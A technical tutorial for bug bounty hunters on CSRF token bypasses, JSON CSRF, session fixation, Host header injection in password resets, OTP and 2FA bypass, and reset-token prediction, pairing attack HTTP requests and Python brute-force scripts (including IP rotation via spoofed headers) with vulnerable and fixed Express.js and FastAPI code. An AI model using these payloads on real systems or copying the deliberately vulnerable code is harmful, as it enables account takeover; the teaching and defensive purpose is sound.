---
title: "CSRF, Session Fixation, and Authentication Bypass: Advanced Exploitation Techniques for Bug Bounty Hunters"
slug: "csrf-session-fixation-authentication-bypass-advanced-exploitation"
meta_description: "Complete technical guide to exploiting CSRF token bypasses, JSON CSRF, session fixation, OTP brute force, 2FA bypass, OAuth misconfigurations, and password reset vulnerabilities. Includes Burp Suite workflows, real payloads, Express.js and FastAPI vulnerable and fixed code."
keywords:
  - CSRF attack
  - CSRF token bypass
  - JSON CSRF
  - SameSite cookie bypass
  - session fixation
  - session hijacking
  - OTP brute force
  - 2FA bypass
  - OAuth misconfiguration
  - password reset vulnerability
  - host header injection
  - authentication bypass
  - bug bounty authentication
  - Express.js session security
  - FastAPI authentication security
  - Burp Suite CSRF testing
---

# CSRF, Session Fixation, and Authentication Bypass: Advanced Exploitation Techniques for Bug Bounty Hunters

## Introduction

Authentication and session management vulnerabilities remain the most impactful bug classes in web application security. While CSRF alone might net a Medium-severity payout, chaining it with session fixation or using it as a stepping stone to full authentication bypass can push a report into Critical territory with five-figure bounties.

This guide covers the full spectrum: from classical CSRF token bypasses through modern JSON CSRF techniques, session fixation attacks, OTP brute forcing, 2FA bypass methods, OAuth misconfigurations, and password reset flow exploitation. Every technique includes real HTTP requests, exploitation code, Burp Suite workflows, and production-grade fixes in Express.js and FastAPI.

The target audience is experienced bug bounty hunters, penetration testers, and developers who already understand HTTP, cookies, JWT, and the basics of authentication. We will not waste time on introductory material. If you understand how a session cookie works and how to use Burp Suite Repeater, you are ready.

---

## 1. CSRF with Missing SameSite Cookie Attribute

The `SameSite` cookie attribute is the browser's native CSRF defense. When set to `Strict` or `Lax`, the browser will not send the cookie on cross-origin requests initiated by third-party sites. When it is missing, browsers default to `Lax` in modern versions (Chrome 80+, Firefox 96+, Edge 80+), but there are critical exceptions.

### 1.1 When Lax Default Is Not Enough

The `Lax` default only blocks cookies on cross-site POST requests that use standard form submissions. However:

- **Top-level GET requests still send cookies.** If a state-changing action is performed via GET (e.g., `GET /api/account/delete?confirm=true`), `SameSite=Lax` does not protect it.
- **Within the first 2 minutes of being set, Chrome's "Lax+POST" exception allows POST requests with the cookie.** This is designed for SSO flows but creates a CSRF window.
- **Subdomains:** `SameSite` is based on the registrable domain. If the attacker controls `evil.example.com`, they can CSRF `app.example.com` because they share the same site.

### 1.2 Identifying Missing SameSite

**Burp Suite approach:**

1. Log in to the target application.
2. Go to **Proxy > HTTP History**.
3. Find the `Set-Cookie` header in the authentication response.
4. Check if `SameSite` is explicitly set. If absent, note the browser's default behavior.

```http
HTTP/1.1 200 OK
Set-Cookie: session=abc123; Path=/; HttpOnly
```

No `SameSite` attribute. On older browsers, this cookie will be sent on all cross-site requests.

### 1.3 CSRF Exploitation When SameSite Is Missing

**Attacker's page (classic form CSRF):**

```html
<html>
<body>
  <h1>You won a prize! Click below to claim.</h1>
  <form id="csrf-form" action="https://target.com/api/account/email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
  <script>
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

When the victim visits this page, their browser submits the form to `target.com` with their session cookie, changing the account email to the attacker's address.

### 1.4 Vulnerable Express.js Session Configuration

```javascript
// app.js -- VULNERABLE
const session = require('express-session');

app.use(session({
  secret: 'keyboard-cat',
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: false,       // Not HTTPS-only
    // No sameSite set
    // No maxAge set -- session cookie
  }
}));
```

**Fixed Express.js session configuration:**

```javascript
// app.js -- FIXED
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const { createClient } = require('redis');

const redisClient = createClient({ url: process.env.REDIS_URL });
redisClient.connect();

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET, // Strong secret from environment
  resave: false,
  saveUninitialized: false,
  name: '__Host-sid', // __Host- prefix enforces Secure + Path=/ + no Domain
  cookie: {
    httpOnly: true,
    secure: true,        // HTTPS only
    sameSite: 'strict',  // No cross-site cookie sending
    maxAge: 3600000,     // 1 hour
    path: '/',
  }
}));
```

---

## 2. CSRF Token Bypass Techniques

Applications that implement CSRF tokens often do so incorrectly. Here are the most common bypass techniques, each of which I have encountered in real-world bug bounty programs.

### 2.1 Removing the CSRF Token Entirely

Many implementations check: "if a CSRF token is present in the request, validate it." If the parameter is absent, the check passes.

**Original request:**

```http
POST /api/account/email HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

email=new@email.com&csrf_token=a1b2c3d4e5f6
```

**Bypass -- remove the token parameter:**

```http
POST /api/account/email HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

email=attacker@evil.com
```

**Testing in Burp Suite:**

1. Send the request to Repeater.
2. Remove the `csrf_token` parameter entirely.
3. Send the request. If it succeeds (200 OK, email changed), the CSRF check is broken.

### 2.2 Empty CSRF Token

```http
POST /api/account/email HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

email=attacker@evil.com&csrf_token=
```

Some implementations check `if (req.body.csrf_token !== undefined)` but do not validate the value.

### 2.3 Reusing Another User's CSRF Token

If CSRF tokens are not tied to the user's session, any valid token works for any user:

1. Log in as attacker. Extract the CSRF token.
2. Use that token in a CSRF attack against the victim.

**Testing:**

1. Log in with Account A. Copy the CSRF token.
2. Log in with Account B in a different browser/incognito.
3. In Burp Repeater, send a request from Account B's session but with Account A's CSRF token.
4. If it succeeds, tokens are not session-bound.

### 2.4 Switching HTTP Method

If the server validates CSRF tokens on POST but not GET:

```http
GET /api/account/email?email=attacker@evil.com HTTP/1.1
Host: target.com
Cookie: session=abc123
```

Many frameworks route `GET` and `POST` to the same handler, and the CSRF middleware only checks `POST`.

### 2.5 CSRF Token in Cookie vs. Header Mismatch

The "double submit cookie" pattern sets a CSRF token in both a cookie and a request header/body. The server checks that they match. If the attacker can set cookies on the target domain (via a subdomain XSS, CRLF injection, or cookie tossing), they can set both values.

**Cookie tossing attack:**

If the attacker controls `evil.target.com`:

```javascript
// Attacker's page on evil.target.com
document.cookie = "csrf=attacker-token; domain=.target.com; path=/";
```

Now the attacker's CSRF form includes `csrf_token=attacker-token` in the body, and the cookie is also `csrf=attacker-token`. The server sees a match and accepts the request.

### 2.6 Vulnerable CSRF Middleware (Express.js)

```javascript
// middleware/csrf.js -- VULNERABLE
function csrfProtection(req, res, next) {
  if (req.method === 'GET') {
    return next(); // Skip GET requests
  }
  
  const token = req.body.csrf_token || req.headers['x-csrf-token'];
  
  // Bug 1: If token is undefined/empty, validation passes
  if (!token) {
    return next();
  }
  
  // Bug 2: Token is not tied to session -- any valid token works
  if (!validTokens.has(token)) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  
  // Bug 3: Token is not consumed after use -- can be replayed
  next();
}
```

**Fixed CSRF middleware:**

```javascript
// middleware/csrf.js -- FIXED
const crypto = require('crypto');

function generateCsrfToken(session) {
  const token = crypto.randomBytes(32).toString('hex');
  session.csrfToken = token;
  return token;
}

function csrfProtection(req, res, next) {
  // Exempt only safe methods
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next();
  }
  
  const token = req.body.csrf_token || req.headers['x-csrf-token'];
  
  // Reject if token is missing or empty
  if (!token || typeof token !== 'string' || token.length === 0) {
    return res.status(403).json({ error: 'CSRF token required' });
  }
  
  // Token must match session-bound token (timing-safe comparison)
  if (!req.session.csrfToken || 
      !crypto.timingSafeEqual(
        Buffer.from(token),
        Buffer.from(req.session.csrfToken)
      )) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }
  
  // Rotate token after use
  req.session.csrfToken = crypto.randomBytes(32).toString('hex');
  
  next();
}
```

---

## 3. JSON-Based CSRF

Modern SPAs send JSON payloads with `Content-Type: application/json`. HTML forms cannot set this content type natively, which creates a partial CSRF defense. But it is bypassable.

### 3.1 Plain Form Submission with JSON-like Body

If the server does not check `Content-Type`:

```html
<form action="https://target.com/api/account/email" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}' />
  <input type="submit" value="Click me"/>
</form>
```

This sends:

```
{"email":"attacker@evil.com","ignore":"="}
```

The `=` between name and value is part of `text/plain` encoding. The JSON is technically valid if the server ignores the extra `ignore` field.

### 3.2 Using fetch() with no-cors

`fetch()` in `no-cors` mode can send POST requests with `text/plain` content type:

```html
<script>
fetch('https://target.com/api/account/email', {
  method: 'POST',
  mode: 'no-cors',
  headers: { 'Content-Type': 'text/plain' },
  body: JSON.stringify({ email: 'attacker@evil.com' })
});
</script>
```

If the server's JSON parser accepts `text/plain` content type (Express.js does with `app.use(express.json({ type: '*/*' }))`), this is a valid CSRF.

### 3.3 Flash-Based Content-Type Override (Legacy)

In older environments with Flash installed, an attacker could use Flash to send requests with arbitrary `Content-Type` headers. While Flash is dead, the lesson remains: never rely solely on `Content-Type` checking for CSRF defense.

### 3.4 Prevention: Strict Content-Type Checking + CSRF Tokens

```javascript
// Express.js -- FIXED
// Only parse JSON for application/json content type (the default)
app.use(express.json()); // Do NOT use { type: '*/*' }

// Additionally, validate Origin/Referer headers
function originCheck(req, res, next) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
  
  const origin = req.headers['origin'];
  const referer = req.headers['referer'];
  
  const allowed = ['https://target.com', 'https://app.target.com'];
  
  if (origin && !allowed.includes(origin)) {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  
  if (!origin && referer) {
    const refererOrigin = new URL(referer).origin;
    if (!allowed.includes(refererOrigin)) {
      return res.status(403).json({ error: 'Invalid referer' });
    }
  }
  
  if (!origin && !referer) {
    // Both missing -- reject (conservative) or allow (permissive)
    // Recommendation: reject for sensitive endpoints
    return res.status(403).json({ error: 'Origin/Referer header required' });
  }
  
  next();
}
```

---

## 4. Weak Password Reset Flow Exploitation

Password reset flows are the most audited and yet most frequently broken feature in web applications. The attack surface is enormous.

### 4.1 Password Reset Token in URL (Referer Leakage)

If the password reset link is `https://target.com/reset?token=abc123` and the reset page loads external resources (analytics scripts, images, fonts), the token leaks via the `Referer` header.

**Exploitation:**

1. Request a password reset for the victim.
2. If the reset page loads `https://analytics.external.com/script.js`, the `Referer` header sent to `analytics.external.com` will contain the token.
3. If the attacker can access the analytics provider's logs (or if the analytics JS is attacker-controlled), they obtain the token.

**Prevention:**

```html
<!-- Add Referrer-Policy to the reset page -->
<meta name="referrer" content="no-referrer">
```

```javascript
// Express.js -- set header on reset endpoint
router.get('/reset', (req, res) => {
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.render('reset-password');
});
```

### 4.2 Predictable Reset Tokens

```javascript
// VULNERABLE -- predictable token generation
function generateResetToken(userId) {
  // Using timestamp + user ID -- completely predictable
  return Buffer.from(`${userId}:${Date.now()}`).toString('base64');
}
```

An attacker who knows the user ID and can guess the approximate time the token was generated can brute-force the token.

```javascript
// FIXED -- cryptographically secure token generation
const crypto = require('crypto');

async function generateResetToken(userId) {
  const token = crypto.randomBytes(32).toString('hex');
  const tokenHash = crypto.createHash('sha256').update(token).digest('hex');
  
  // Store the HASH, not the token itself
  await db.query(
    'INSERT INTO password_resets (user_id, token_hash, expires_at) VALUES ($1, $2, NOW() + INTERVAL \'15 minutes\')',
    [userId, tokenHash]
  );
  
  return token; // Send this in the email
}

async function validateResetToken(token) {
  const tokenHash = crypto.createHash('sha256').update(token).digest('hex');
  const result = await db.query(
    'SELECT user_id FROM password_resets WHERE token_hash = $1 AND expires_at > NOW() AND used = false',
    [tokenHash]
  );
  return result.rows[0] || null;
}
```

### 4.3 Password Reset Token Not Invalidated After Use

If the token is not marked as used after a successful password reset, the attacker can reuse a previously captured token (from logs, email compromises, or MITM).

```javascript
// FIXED -- invalidate token after use
async function resetPassword(token, newPassword) {
  const tokenHash = crypto.createHash('sha256').update(token).digest('hex');
  
  const result = await db.query(
    'UPDATE password_resets SET used = true WHERE token_hash = $1 AND expires_at > NOW() AND used = false RETURNING user_id',
    [tokenHash]
  );
  
  if (result.rows.length === 0) {
    throw new Error('Invalid or expired token');
  }
  
  const userId = result.rows[0].user_id;
  const hashedPassword = await bcrypt.hash(newPassword, 12);
  
  await db.query('UPDATE users SET password_hash = $1 WHERE id = $2', [hashedPassword, userId]);
  
  // Also invalidate ALL sessions for this user
  await db.query('DELETE FROM sessions WHERE user_id = $1', [userId]);
  
  // And invalidate all other reset tokens for this user
  await db.query('UPDATE password_resets SET used = true WHERE user_id = $1', [userId]);
}
```

---

## 5. Host Header Injection in Password Reset Emails

This is one of the most elegant and frequently exploitable authentication vulnerabilities. If the application uses the `Host` header to construct password reset URLs, the attacker can inject their own domain.

### 5.1 How It Works

1. The attacker requests a password reset for the victim's email.
2. The attacker modifies the `Host` header to point to their server.
3. The application generates the reset link using the `Host` header: `https://{Host}/reset?token=abc123`.
4. The victim receives an email with `https://attacker.com/reset?token=abc123`.
5. If the victim clicks the link, the token is sent to the attacker's server.

### 5.2 Exploitation with Burp Suite

```http
POST /api/auth/forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/json
X-Forwarded-Host: attacker.com

{
  "email": "victim@target.com"
}
```

Some servers check the `Host` header but not `X-Forwarded-Host`. Try both. Also try:

```http
Host: target.com
X-Forwarded-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Original-URL: https://attacker.com
X-Rewrite-URL: https://attacker.com
```

**Another variation -- absolute URL in Host:**

```http
Host: target.com@attacker.com
```

Or using a port:

```http
Host: target.com:attacker.com
```

### 5.3 Vulnerable Express.js Code

```javascript
// routes/auth.js -- VULNERABLE
router.post('/api/auth/forgot-password', async (req, res) => {
  const { email } = req.body;
  const user = await db.findUserByEmail(email);
  if (!user) return res.json({ message: 'If account exists, email sent' });

  const token = await generateResetToken(user.id);

  // VULNERABLE: using req.headers.host to build the URL
  const resetUrl = `https://${req.headers.host}/reset?token=${token}`;
  
  await sendEmail(user.email, 'Password Reset', `Click here: ${resetUrl}`);
  
  res.json({ message: 'If account exists, email sent' });
});
```

**Fixed code:**

```javascript
// routes/auth.js -- FIXED
const ALLOWED_HOST = process.env.APP_HOST; // 'target.com'

router.post('/api/auth/forgot-password', async (req, res) => {
  const { email } = req.body;
  const user = await db.findUserByEmail(email);
  if (!user) return res.json({ message: 'If account exists, email sent' });

  const token = await generateResetToken(user.id);

  // FIXED: use a hardcoded, trusted base URL
  const resetUrl = `https://${ALLOWED_HOST}/reset?token=${token}`;
  
  await sendEmail(user.email, 'Password Reset', `Click here: ${resetUrl}`);
  
  res.json({ message: 'If account exists, email sent' });
});
```

### 5.4 Vulnerable FastAPI Code

```python
# routes/auth.py -- VULNERABLE
from fastapi import APIRouter, Request
from app.services import user_service, email_service, token_service

router = APIRouter()

@router.post("/api/auth/forgot-password")
async def forgot_password(request: Request):
    body = await request.json()
    email = body.get("email")
    user = await user_service.find_by_email(email)
    if not user:
        return {"message": "If account exists, email sent"}

    token = await token_service.generate_reset_token(user.id)

    # VULNERABLE: using request host
    host = request.headers.get("x-forwarded-host", request.headers.get("host"))
    reset_url = f"https://{host}/reset?token={token}"

    await email_service.send_reset_email(user.email, reset_url)
    return {"message": "If account exists, email sent"}
```

**Fixed FastAPI code:**

```python
# routes/auth.py -- FIXED
import os
from fastapi import APIRouter, Request
from app.services import user_service, email_service, token_service

router = APIRouter()
TRUSTED_HOST = os.environ["APP_HOST"]  # "target.com"

@router.post("/api/auth/forgot-password")
async def forgot_password(request: Request):
    body = await request.json()
    email = body.get("email")
    user = await user_service.find_by_email(email)
    if not user:
        return {"message": "If account exists, email sent"}

    token = await token_service.generate_reset_token(user.id)

    # FIXED: hardcoded trusted host
    reset_url = f"https://{TRUSTED_HOST}/reset?token={token}"

    await email_service.send_reset_email(user.email, reset_url)
    return {"message": "If account exists, email sent"}
```

---

## 6. OTP Brute Force and Rate Limiting Bypass

One-time passwords are typically 4-6 digits. A 6-digit OTP has 1,000,000 possible values. Without rate limiting, an attacker can brute-force it in minutes.

### 6.1 Basic OTP Brute Force

```http
POST /api/auth/verify-otp HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "email": "victim@target.com",
  "otp": "000000"
}
```

Burp Suite Intruder configuration:

1. Send the request to Intruder.
2. Set the `otp` value as the payload position.
3. Payload type: Numbers, from 0 to 999999, step 1, min integer digits 6.
4. Start the attack.

### 6.2 Rate Limiting Bypass Techniques

**IP rotation via X-Forwarded-For:**

```http
POST /api/auth/verify-otp HTTP/1.1
Host: target.com
X-Forwarded-For: 1.2.3.4
Content-Type: application/json

{
  "email": "victim@target.com",
  "otp": "123456"
}
```

If the server uses `X-Forwarded-For` for rate limiting, the attacker rotates IP addresses:

```python
# Brute force with IP rotation
import requests
import random

url = "https://target.com/api/auth/verify-otp"

for otp in range(1000000):
    fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    response = requests.post(url, json={
        "email": "victim@target.com",
        "otp": f"{otp:06d}"
    }, headers={
        "X-Forwarded-For": fake_ip,
        "X-Real-IP": fake_ip,
        "X-Originating-IP": fake_ip,
    })
    
    if response.status_code == 200 and "success" in response.text:
        print(f"[+] Valid OTP found: {otp:06d}")
        break
```

**Multiple parameters / array injection:**

Some applications accept multiple OTP values in a single request:

```json
{
  "email": "victim@target.com",
  "otp": ["000000", "000001", "000002", "000003", "000004"]
}
```

Or via parameter pollution:

```
otp=000000&otp=000001&otp=000002
```

**Race condition:**

Send hundreds of OTP verification requests simultaneously before the rate limiter processes them. Use Burp Suite Turbo Intruder or Burp's built-in "Send group in parallel" feature.

### 6.3 Response Manipulation

If the OTP verification response is checked client-side:

```json
// Server response for wrong OTP
{ "success": false, "message": "Invalid OTP" }

// Server response for correct OTP
{ "success": true, "message": "OTP verified", "token": "jwt-token-here" }
```

Using Burp Suite Match and Replace:

1. Go to **Proxy > Options > Match and Replace**.
2. Add a rule: Replace `"success": false` with `"success": true` in response body.
3. If the client-side checks this value without server-side session state verification, the attacker gains access.

This is a client-side bypass and only works if the server does not enforce state on subsequent requests. However, many SPAs check the response and navigate to the dashboard without additional server validation.

### 6.4 Fixed OTP Implementation (Express.js)

```javascript
// routes/auth.js -- FIXED
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');

// Rate limit OTP verification: 5 attempts per 15 minutes per email
const otpLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  keyGenerator: (req) => {
    // Rate limit by email, NOT by IP
    return `otp:${req.body.email}`;
  },
  handler: (req, res) => {
    // Lock the account after too many attempts
    db.query('UPDATE users SET otp_locked_until = NOW() + INTERVAL \'30 minutes\' WHERE email = $1', [req.body.email]);
    res.status(429).json({ error: 'Too many attempts. Account temporarily locked.' });
  }
});

router.post('/api/auth/verify-otp', otpLimiter, async (req, res) => {
  const { email, otp } = req.body;
  
  // Validate input types
  if (typeof otp !== 'string' || otp.length !== 6 || !/^\d{6}$/.test(otp)) {
    return res.status(400).json({ error: 'Invalid OTP format' });
  }
  
  const user = await db.query(
    'SELECT id, otp_hash, otp_expires_at, otp_locked_until FROM users WHERE email = $1',
    [email]
  );
  
  if (!user.rows[0]) {
    return res.status(400).json({ error: 'Invalid credentials' });
  }
  
  const userData = user.rows[0];
  
  // Check if account is locked
  if (userData.otp_locked_until && new Date(userData.otp_locked_until) > new Date()) {
    return res.status(429).json({ error: 'Account temporarily locked' });
  }
  
  // Check OTP expiry
  if (new Date(userData.otp_expires_at) < new Date()) {
    return res.status(400).json({ error: 'OTP expired' });
  }
  
  // Timing-safe comparison of OTP hash
  const otpHash = crypto.createHash('sha256').update(otp).digest('hex');
  if (!crypto.timingSafeEqual(Buffer.from(otpHash), Buffer.from(userData.otp_hash))) {
    // Increment failed attempts counter (tracked in rate limiter)
    return res.status(400).json({ error: 'Invalid OTP' });
  }
  
  // Invalidate OTP after successful use
  await db.query('UPDATE users SET otp_hash = NULL, otp_expires_at = NULL WHERE id = $1', [userData.id]);
  
  // Create session
  req.session.userId = userData.id;
  req.session.authenticated = true;
  
  res.json({ success: true });
});
```

---

## 7. Session Fixation Attacks

Session fixation occurs when an attacker can set or force a known session identifier on the victim. After the victim authenticates with that session ID, the attacker can use the same ID to access the victim's authenticated session.

### 7.1 How Session Fixation Works

1. Attacker obtains a valid session ID from the application (visits the login page, receives a session cookie).
2. Attacker forces this session ID onto the victim (via URL parameter, cookie injection, or meta tag).
3. Victim logs in. The application does not regenerate the session ID.
4. Attacker uses the known session ID to access the victim's authenticated session.

### 7.2 Exploitation via Cookie Injection

If the attacker can set cookies on the target domain (via subdomain control, XSS on a subdomain, or CRLF injection):

```javascript
// Attacker's page on evil.target.com (same-site cookie injection)
document.cookie = "connect.sid=attacker-known-session-id; domain=.target.com; path=/";
// Now redirect victim to target.com/login
window.location = "https://target.com/login";
```

### 7.3 Exploitation via URL Parameter

Some older frameworks accept session IDs in the URL:

```
https://target.com/login;jsessionid=attacker-known-session-id
```

### 7.4 Vulnerable Express.js Code

```javascript
// routes/auth.js -- VULNERABLE
router.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await authenticate(email, password);
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // VULNERABLE: session ID is NOT regenerated after login
  // The pre-login session ID persists into the authenticated session
  req.session.userId = user.id;
  req.session.authenticated = true;
  
  res.json({ success: true, user: { id: user.id, name: user.name } });
});
```

**Fixed code with session regeneration:**

```javascript
// routes/auth.js -- FIXED
router.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await authenticate(email, password);
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // FIXED: regenerate session ID after authentication
  const oldSession = req.session;
  req.session.regenerate((err) => {
    if (err) {
      return res.status(500).json({ error: 'Session error' });
    }
    
    // Copy necessary non-sensitive data from old session
    req.session.userId = user.id;
    req.session.authenticated = true;
    req.session.loginTime = Date.now();
    req.session.loginIp = req.ip;
    
    req.session.save((err) => {
      if (err) {
        return res.status(500).json({ error: 'Session error' });
      }
      res.json({ success: true, user: { id: user.id, name: user.name } });
    });
  });
});
```

### 7.5 Vulnerable FastAPI Code

```python
# routes/auth.py -- VULNERABLE
from fastapi import APIRouter, Request, Response
from app.services import auth_service
import uuid

router = APIRouter()

@router.post("/api/auth/login")
async def login(request: Request, response: Response):
    body = await request.json()
    user = await auth_service.authenticate(body["email"], body["password"])
    
    if not user:
        return {"error": "Invalid credentials"}
    
    # VULNERABLE: reusing the existing session ID
    session_id = request.cookies.get("session_id")
    if not session_id:
        session_id = str(uuid.uuid4())
    
    # Store user in session with existing ID
    await auth_service.create_session(session_id, user.id)
    
    response.set_cookie("session_id", session_id, httponly=True)
    return {"success": True, "user": {"id": user.id, "name": user.name}}
```

**Fixed FastAPI code:**

```python
# routes/auth.py -- FIXED
import secrets
from fastapi import APIRouter, Request, Response
from app.services import auth_service

router = APIRouter()

@router.post("/api/auth/login")
async def login(request: Request, response: Response):
    body = await request.json()
    user = await auth_service.authenticate(body["email"], body["password"])
    
    if not user:
        return {"error": "Invalid credentials"}
    
    # FIXED: destroy old session and create a new one
    old_session_id = request.cookies.get("session_id")
    if old_session_id:
        await auth_service.destroy_session(old_session_id)
    
    # Generate a new cryptographically secure session ID
    new_session_id = secrets.token_hex(32)
    await auth_service.create_session(new_session_id, user.id)
    
    response.set_cookie(
        "session_id",
        new_session_id,
        httponly=True,
        secure=True,
        samesite="strict",
        max_age=3600,
        path="/"
    )
    return {"success": True, "user": {"id": user.id, "name": user.name}}
```

---

## 8. Weak Session Invalidation

A correctly functioning application must invalidate sessions on logout, password change, and password reset. Failure to do so means compromised sessions remain active indefinitely.

### 8.1 Session Not Destroyed on Logout

```javascript
// routes/auth.js -- VULNERABLE
router.post('/api/auth/logout', (req, res) => {
  // VULNERABLE: only clears the cookie, does not destroy the server-side session
  res.clearCookie('connect.sid');
  res.json({ success: true });
});
```

The session still exists in the session store. If the attacker has the session ID (from XSS, MITM, or logs), they can still use it.

**Fixed logout:**

```javascript
// routes/auth.js -- FIXED
router.post('/api/auth/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({ error: 'Logout failed' });
    }
    res.clearCookie('connect.sid', { path: '/' });
    res.json({ success: true });
  });
});
```

### 8.2 Sessions Not Invalidated on Password Change

When a user changes their password, all existing sessions except the current one should be destroyed:

```javascript
// routes/account.js -- FIXED
router.post('/api/account/change-password', requireAuth, async (req, res) => {
  const { currentPassword, newPassword } = req.body;
  
  const user = await db.query('SELECT password_hash FROM users WHERE id = $1', [req.session.userId]);
  const valid = await bcrypt.compare(currentPassword, user.rows[0].password_hash);
  
  if (!valid) {
    return res.status(401).json({ error: 'Current password incorrect' });
  }
  
  const newHash = await bcrypt.hash(newPassword, 12);
  await db.query('UPDATE users SET password_hash = $1 WHERE id = $2', [newHash, req.session.userId]);
  
  // Destroy ALL sessions for this user except the current one
  const currentSessionId = req.sessionID;
  await destroyAllUserSessions(req.session.userId, currentSessionId);
  
  res.json({ success: true });
});

async function destroyAllUserSessions(userId, exceptSessionId) {
  // If using Redis session store
  const keys = await redisClient.keys('sess:*');
  for (const key of keys) {
    const session = JSON.parse(await redisClient.get(key));
    if (session.userId === userId && key !== `sess:${exceptSessionId}`) {
      await redisClient.del(key);
    }
  }
}
```

### 8.3 Testing Session Invalidation

1. Log in from Browser A. Copy the session cookie.
2. Log out from Browser A.
3. In Burp Suite Repeater, send a request using the old session cookie.
4. If the request succeeds (200 OK with authenticated data), the session was not destroyed.

Repeat the same test after password change and password reset.

---

## 9. Email Verification Bypass

### 9.1 Changing Email After Verification

1. Register with a legitimate email, verify it.
2. Change the email to the victim's email (e.g., via profile update endpoint).
3. If the application does not re-verify the new email, the attacker now controls an account associated with the victim's email.

**Testing:**

```http
PUT /api/account/email HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=abc123

{
  "email": "victim@target.com"
}
```

Check if the `email_verified` flag remains `true` after the change.

### 9.2 Verification Token Manipulation

If the verification URL is `https://target.com/verify?token=abc&email=user@example.com`, try changing the email parameter:

```
https://target.com/verify?token=abc&email=victim@target.com
```

If the server uses the `email` parameter from the URL instead of the email associated with the token, the attacker verifies the victim's email on their account.

### 9.3 Race Condition in Verification

1. Register two accounts simultaneously with the same email.
2. The verification email is sent to the same address.
3. Both accounts may end up verified if the application does not enforce uniqueness atomically.

### 9.4 Response Manipulation

As with OTP, if the verification endpoint returns a boolean and the client-side trusts it:

```json
// Modify response in Burp
{ "verified": true }
```

---

## 10. 2FA Bypass Techniques

### 10.1 Direct Endpoint Access (Skipping 2FA Step)

After entering the correct username/password, the server often sets a session state like `2fa_pending`. If the application does not check this state on subsequent requests:

```http
GET /api/dashboard HTTP/1.1
Host: target.com
Cookie: session=abc123
```

If the server responds with dashboard data despite `2fa_pending` state, 2FA is bypassed.

**Testing:**

1. Enter valid credentials. Stop at the 2FA prompt.
2. In Burp, send a request to an authenticated endpoint (like `/api/me` or `/api/dashboard`).
3. If you get authenticated data, 2FA is not enforced.

### 10.2 Empty or Null 2FA Code

```http
POST /api/auth/verify-2fa HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=abc123

{
  "code": ""
}
```

```http
POST /api/auth/verify-2fa HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=abc123

{
  "code": null
}
```

```http
POST /api/auth/verify-2fa HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=abc123

{}
```

Some implementations only validate the code if it is present.

### 10.3 Backup Code Brute Force

Backup codes are often 8-character alphanumeric strings, but some applications use shorter numeric codes. If there is no rate limiting on backup code verification:

```python
import requests
import itertools
import string

url = "https://target.com/api/auth/verify-2fa"
session_cookie = "abc123"

# If backup codes are 6-digit numeric
for code in range(1000000):
    response = requests.post(url, json={
        "code": f"{code:06d}",
        "type": "backup"
    }, cookies={"session": session_cookie})
    
    if response.status_code == 200 and "success" in response.text:
        print(f"[+] Valid backup code: {code:06d}")
        break
```

### 10.4 2FA Code Reuse

If the TOTP code is not invalidated after use, the same 30-second code can be replayed:

1. Intercept a valid 2FA verification request.
2. The 30-second window has not expired.
3. Replay the same request with the same code for a different session.

### 10.5 2FA Disable Without Verification

Some applications allow disabling 2FA from account settings without re-verifying the 2FA code or password:

```http
POST /api/account/2fa/disable HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=abc123

{}
```

If this works without requiring the current 2FA code or password, an attacker with a session (via XSS, session fixation, etc.) can disable 2FA and then change the password.

### 10.6 Comprehensive 2FA Middleware (Express.js)

```javascript
// middleware/require2fa.js -- FIXED
function requireFullAuth(req, res, next) {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  if (req.session.twoFactorPending) {
    return res.status(403).json({ 
      error: '2FA verification required',
      redirect: '/auth/2fa'
    });
  }
  
  if (!req.session.fullyAuthenticated) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  next();
}

// Apply to ALL authenticated routes
app.use('/api/dashboard', requireFullAuth);
app.use('/api/account', requireFullAuth);
app.use('/api/admin', requireFullAuth);
```

---

## 11. Account Takeover via Password Reset Token Prediction

### 11.1 UUID v1 Prediction

UUID v1 tokens contain a timestamp and MAC address. If the application uses UUID v1 for password reset tokens, an attacker who can request a reset for their own account and observe the timing can predict tokens for other accounts.

```python
# Analyzing UUID v1 tokens
import uuid

# Token received: 6ba7b810-9dad-11d1-80b4-00c04fd430c8
# UUID v1 structure: time_low-time_mid-time_hi_version-clock_seq-node
# The timestamp is embedded in the first three fields

token = uuid.UUID("6ba7b810-9dad-11d1-80b4-00c04fd430c8")
print(f"Version: {token.version}")  # 1
print(f"Timestamp: {token.time}")   # 100-nanosecond intervals since Oct 15, 1582
